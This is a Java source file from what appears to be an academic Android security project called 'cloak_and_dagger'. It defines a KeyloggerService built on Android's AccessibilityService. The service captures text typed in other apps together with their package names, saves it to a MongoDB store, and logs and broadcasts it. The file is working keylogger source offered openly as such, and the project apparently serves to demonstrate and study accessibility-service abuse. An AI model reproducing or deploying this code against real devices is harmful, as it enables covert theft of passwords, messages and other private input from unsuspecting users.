package pl.edu.agh.sarna.cloak_and_dagger;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_NAME;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_VALUE;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.LOG_TAG;
import static pl.edu.agh.sarna.db.mongo.scripts.CloakScripts.saveCloakTextToMongo;
import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.getLastCloakRunID;
import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.insertCloakText;

public class KeyloggerService extends AccessibilityService {

    private KeyloggerBuffer buffer = new KeyloggerBuffer((text, packageName) -> {
//        insertCloakText(getApplicationContext(), getLastCloakRunID(getApplicationContext()), text, packageName);
        saveCloakTextToMongo(text, packageName);
        String displayText = String.format("Saved text \"%s\" from %s", text, packageName);
        Log.d(LOG_TAG, displayText);
        LocalBroadcastManager.getInstance(KeyloggerService.this)
                .sendBroadcast(new Intent(INTENT_NAME).putExtra(INTENT_VALUE, displayText));
    });

    public static boolean isRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (manager == null) {
            return false;
        }
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (service.service.getClassName().equals(KeyloggerService.class.getName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        buffer.updateState(event);
    }

    @Override
    public void onInterrupt() {
    }

}